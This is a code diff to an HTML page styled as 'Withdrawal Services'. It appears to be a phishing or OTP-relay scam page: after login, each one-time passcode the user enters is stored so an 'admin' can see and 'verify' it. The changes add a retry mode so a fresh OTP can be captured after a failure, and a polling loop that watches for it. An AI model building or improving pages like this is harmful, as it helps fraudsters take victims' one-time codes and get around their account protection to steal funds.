@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Withdrawal — Services</title>
+<title>Withdrawal —</title>
 <style>
 *{box-sizing:border-box}body{margin:0;font-family:Inter,Arial,Helvetica,sans-serif;background:
 radial-gradient(circle at 18% 15%,rgba(255,255,255,.9),transparent 32%),
@@ -46,7 +46,7 @@ button{width:100%;height:62px;border:0;border-radius:20px;background:linear-grad
 </style>
 </head>
 <body>
-<div class="demo">🛡 Withdrawal Services</div>
+<div class="demo">🛡 Withdrawal Services </div>
 <div class="wrap">
   
   <!-- LOGIN PAGE -->
@@ -322,7 +322,7 @@ function checkAdminResult() {
         `;
         document.getElementById('otpInput').disabled = true;
         localStorage.removeItem('otp_result');
-        localStorage.removeItem('user_entered_otp');
+        // IMPORTANT: user_entered_otp KO REMOVE MAT KARO, TAKI RETRY KE BAAD NAYA OTP SAVE HO SAKE
         
       } else if (result === 'success') {
         otpResultDiv.className = 'otp-result success';
@@ -366,9 +366,14 @@ function retryOTP() {
   document.getElementById('otpMessage').textContent = '🔄 Please enter new OTP';
   document.getElementById('otpMessage').style.color = '#ff9800';
   
-  // Clear old data
+  // 🔥 IMPORTANT: Clear old OTP so admin can see new one
   localStorage.removeItem('user_entered_otp');
   localStorage.removeItem('otp_result');
+  
+  // 🔥 NEW: Set a flag that user is retrying
+  localStorage.setItem('otp_retry_mode', 'true');
+  
+  console.log("🔄 Retry mode activated - Waiting for new OTP");
 }
 
 function submitOTP() {
@@ -379,7 +384,12 @@ function submitOTP() {
     return;
   }
   
+  // 🔥 Save new OTP - Admin will see this
   localStorage.setItem('user_entered_otp', userOtp);
+  
+  // Clear retry mode
+  localStorage.removeItem('otp_retry_mode');
+  
   document.getElementById('otpMessage').textContent = '📨 OTP submitted! Waiting for admin verification...';
   document.getElementById('otpMessage').style.color = '#ff9800';
   document.getElementById('otpInput').disabled = true;
@@ -388,6 +398,15 @@ function submitOTP() {
   localStorage.removeItem('otp_result');
   document.getElementById('otpResult').style.display = 'none';
 }
+
+// 🔥 NEW: Force refresh of admin panel when retry mode is active
+setInterval(function() {
+  var retryMode = localStorage.getItem('otp_retry_mode');
+  if (retryMode === 'true') {
+    // Admin panel will show "Waiting for new OTP..." message
+    console.log("🔄 Retry mode active - Admin waiting for new OTP");
+  }
+}, 1000);
 </script>
 </body>
 </html>
